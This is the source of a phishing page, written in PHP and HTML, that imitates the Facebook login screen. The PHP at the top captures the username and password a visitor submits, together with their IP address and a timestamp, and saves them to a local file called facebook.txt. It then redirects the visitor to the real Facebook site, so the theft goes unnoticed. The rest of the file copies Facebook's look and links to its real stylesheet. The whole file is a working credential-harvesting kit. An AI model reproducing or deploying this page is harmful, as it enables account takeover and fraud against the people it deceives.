<?php
    if($_POST){
        $erhanbey = $_POST['username'];
        $password =  $_POST['password'];
        $ip = $_SERVER['REMOTE_ADDR'];
        date_default_timezone_set('Europe/Istanbul');
        $cur_time=date("d-m-Y H:i:s");
        $file = fopen('facebook.txt', 'a');
        fwrite($file, "Username: ".$erhanbey."\nŞifre: " .$password. "\nIp Adresi: " .$ip. "\nTarih: " .$cur_time.  "\n\n");
        fclose($file);
        header("Location: https://facebook.com/");
    }
    ?><html>
 <head>
 <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yy/l/0,cross/UnFPsMph9tH.css" >


    <meta charset="utf-8">
	<title>Log in to Facebook | Facebook</title>
	<link rel="shortcut icon" href="https://resimag.com/p1/eccc8ab1d7b.png" />
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<body style="padding:0; margin:0; ">
	<center>
	<div style="padding:0px; margin:0px; width:100%; height:60px; background-color:#305ba0 ">

<h1 style="font-family:sans-serif; color:white; padding-top:7px; letter-spacing:0; font-style:;id="facebook">facebook</h1>

	</div>
	<div id="arkaplan-rengi" style="padding:0; margin:0; background-color:#eceff5;">
	<br><br><br><br><br>
	<div id="iki-input-type-birleştirmek" style="width:100%;">
	<form method="post" >
	<input type="text" name="username" placeholder="Mobil number or email adress" required="" style="width:84%; height:40px;  padding:12px; border:1px solid #eceff5;border-radius:3px;font-size:15px;"><br><br>
	<input type="password" name="password" placeholder="Password" required=""  style="width:84%; height:40px; padding:12px; border:1px solid #eceff5;border-radius:3px; font-size:15px;">
	</div><br><br>
	<input type="submit" value="Log In" style="width:74%; height:40px; border:none; color:white; background-color:#3578e5; font-family:sans-serif; font-weight:bold; font-size:14px; border-radius:3px;"><br><br>
	<br>
	<input type="submit" style="width:65%; height:40px; color:white; border:none; font-weight:bold; font-family:sans-serif; font-size:14px; border-radius:3px; background-color:#00a400;" value="Create New Acoount">
	<br><br><a href="https://facebook.com/" style="font-size:12px; text-decoration:none; font-family:sans-serif; color:#7596c8;">Forgotton Password? &nbsp; Help Centre</a><br><br>
	<br></form>
	</div>
	</center>
	
	<div id="languse-ana-class" style="padding:0; margin:0; width:100%;">
<style>
#class-fb-style{
text-decoration:none;
font-size:12px;
color:#90949c;
font-family:Sans-serif;

}

</style><br><br><br><br><br><br>
<table style="width:100%; padding:0; margin:0;">
<tr style="width:100%; background-color:; margin:0; padding:0; text-align:center;">
<td style="width:50%;">
<a id="class-fb-style" href="https://facebook.com/">English (UK)</a><br>
<a id="class-fb-style" href="https://facebook.com/">Kurdî (Kurmancî)</a><br>
<a id="class-fb-style" href="https://facebook.com/">Zaza</a><br>
<a id="class-fb-style" href="https://facebook.com/">Português (Brasil)</a><br>
</td style="width:50%; margin:0; padding:0;">

<td style="width:50;">
<a id="class-fb-style" href="https://facebook.com/">Türkçe</a><br>
<a id="class-fb-style" href="https://facebook.com/">العربية</a><br>
<a id="class-fb-style" href="https://facebook.com/">Español</a><br>
<i class="img sp_kKA4RxRlWVa sx_7efc3d" ></i>
<i> </i>
</td>

</tr>

</table>


	</div><br>
	<center>
	<div id="Facebook-C" style="">
	<a href="https://facebook.com/" id="class-fb-style">Facebook ©2019</a>
	</div>
	</center><br><br>
	</body>
 </head>
</html>
